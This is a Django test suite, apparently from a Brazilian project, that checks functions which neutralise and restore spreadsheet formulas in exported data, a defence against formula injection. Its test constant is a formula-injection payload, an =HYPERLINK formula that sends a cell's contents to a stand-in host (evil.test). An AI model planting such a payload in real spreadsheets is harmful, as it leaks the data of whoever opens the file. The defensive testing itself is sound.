"""Testes da neutralização de fórmula em planilha.

O conteúdo exportado é escrito por gente, e quem abre o arquivo é a
secretaria no Excel da própria máquina. `=HYPERLINK` é o caso ruim:
monta um link com dados da própria planilha e, ao contrário de DDE, não
dispara aviso nenhum.
"""
import tablib
from django.test import SimpleTestCase

from apps.common.planilha import (
    desneutralizar_dataset,
    desneutralizar_formula,
    neutralizar_dataset,
    neutralizar_formula,
)

PAYLOAD = '=HYPERLINK("http://evil.test?v="&A1,"Clique aqui")'


class NeutralizarFormulaTests(SimpleTestCase):
    def test_prefixa_os_quatro_inicios_de_formula(self):
        for inicio in ("=", "+", "-", "@"):
            texto = f"{inicio}SOMA(A1:A9)"
            self.assertEqual(neutralizar_formula(texto), f"'{texto}")

    def test_prefixa_tab_e_cr(self):
        """Excel descarta os dois antes de olhar o primeiro caractere."""
        for inicio in ("\t", "\r"):
            self.assertEqual(
                neutralizar_formula(f"{inicio}=1+1"), f"'{inicio}=1+1"
            )

    def test_texto_comum_passa_intacto(self):
        for texto in ("Ana", "2026-03-10", "75.00", "", "O'Brien"):
            self.assertEqual(neutralizar_formula(texto), texto)

    def test_numero_e_none_passam_intactos(self):
        """Só `str` é tocado — coluna numérica não vira texto."""
        self.assertEqual(neutralizar_formula(40), 40)
        self.assertEqual(neutralizar_formula(0), 0)
        self.assertIsNone(neutralizar_formula(None))


class DesneutralizarFormulaTests(SimpleTestCase):
    """A volta existe pro round-trip do import/export de migração."""

    def test_desfaz_o_que_esta_casa_escreveu(self):
        self.assertEqual(
            desneutralizar_formula(neutralizar_formula(PAYLOAD)), PAYLOAD
        )

    def test_apostrofo_legitimo_passa_intacto(self):
        """Só desfaz apóstrofo SEGUIDO de caractere de fórmula."""
        for texto in ("'Aspas'", "'", "'nome", "''"):
            self.assertEqual(desneutralizar_formula(texto), texto)

    def test_ciclos_repetidos_nao_acumulam_marcador(self):
        """Exportar, reimportar e exportar de novo dá o mesmo arquivo."""
        valor = PAYLOAD
        for _ in range(3):
            exportado = neutralizar_formula(valor)
            self.assertEqual(exportado, f"'{PAYLOAD}")
            valor = desneutralizar_formula(exportado)
            self.assertEqual(valor, PAYLOAD)


class DatasetTests(SimpleTestCase):
    """Usado onde a planilha é montada por terceiros (os Resource)."""

    def _dataset(self) -> tablib.Dataset:
        dataset = tablib.Dataset(headers=["nome", "idade"])
        dataset.append([PAYLOAD, 12])
        dataset.append(["Ana", 13])
        return dataset

    def test_neutraliza_todas_as_celulas_preservando_cabecalho(self):
        dataset = neutralizar_dataset(self._dataset())
        self.assertEqual(dataset.headers, ["nome", "idade"])
        self.assertEqual(len(dataset), 2)
        self.assertEqual(dataset[0][0], f"'{PAYLOAD}")
        self.assertEqual(dataset[0][1], 12)
        self.assertEqual(dataset[1][0], "Ana")

    def test_round_trip_do_dataset(self):
        dataset = desneutralizar_dataset(neutralizar_dataset(self._dataset()))
        self.assertEqual(dataset[0][0], PAYLOAD)
        self.assertEqual(dataset[1][0], "Ana")
        self.assertEqual(dataset.headers, ["nome", "idade"])
